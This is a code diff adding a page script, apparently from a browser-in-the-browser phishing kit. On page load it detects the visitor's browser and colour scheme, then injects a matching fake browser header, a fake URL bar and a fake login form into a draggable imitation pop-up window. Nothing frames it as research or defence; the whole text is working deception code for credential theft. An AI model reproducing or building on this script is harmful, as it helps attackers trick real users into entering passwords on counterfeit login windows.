@@ -1,0 +1,28 @@
+<script>
+    function detectAndBuildInterface() {
+        win = document.getElementById("bitbWindow");
+        formContainer = document.getElementById("loginFormContainer");
+        const headerContainer = document.getElementById("dynamicHeaderContainer");
+        
+        const ua = navigator.userAgent.toLowerCase();
+        let detectedBrowser = "chrome";
+
+        if (ua.includes("edg/")) { detectedBrowser = "edge"; }
+        else if (ua.includes("firefox")) { detectedBrowser = "firefox"; }
+        else if (ua.includes("safari") && !ua.includes("chrome") && !ua.includes("chromium")) { detectedBrowser = "safari"; }
+
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            win.classList.add('dark');
+        }
+
+        headerContainer.innerHTML = modules[detectedBrowser].headerHtml;
+        formContainer.innerHTML = modules[detectedBrowser].loginHtml;
+
+        urlInput = document.getElementById("fakeUrlInput");
+        loader = document.getElementById("loaderContainer");
+        tabsBar = document.getElementById("bitbTabsBar");
+
+        initDragLogica();
+    }
+    document.addEventListener("DOMContentLoaded", detectAndBuildInterface);
+</script>
